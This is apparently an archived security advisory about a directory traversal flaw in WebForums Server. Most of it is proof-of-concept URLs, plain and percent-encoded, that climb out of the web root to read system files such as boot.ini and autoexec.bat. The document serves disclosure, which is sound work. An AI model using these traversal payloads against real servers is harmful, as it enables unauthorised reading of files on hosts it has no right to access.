@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/7955/info
+
+It has been reported that WebForums Server does not properly handle some types of requests. Because of this, attackers may be able to gain access to files on the host server with the privileges of the web server process.
+
+http://www.example.com/../../../../autoexec.bat
+http://www.example.com/../../../autoexec.bat
+http://www.example.com/../../boot.ini
+http://www.example.com/../../boot.ini
+http://www.example.com/../../../boot.ini
+http://www.example.com/../../../boot.ini
+
+Additional directory traversal proof of concepts had been provided by R00tCr4ck <root cyberspy org>:
+
+http://www.example.com/..\..\..\file.ext
+http://www.example.com/../../../file.ext
+or as encoded format:
+http://www.example.com/%2E%2E%5C%2E%2E%5C%2E%2E%5Cfile.ext
+http://www.example.com/%2E%2E%2F%2E%2E%2F%2E%2E%2Ffile.ext 
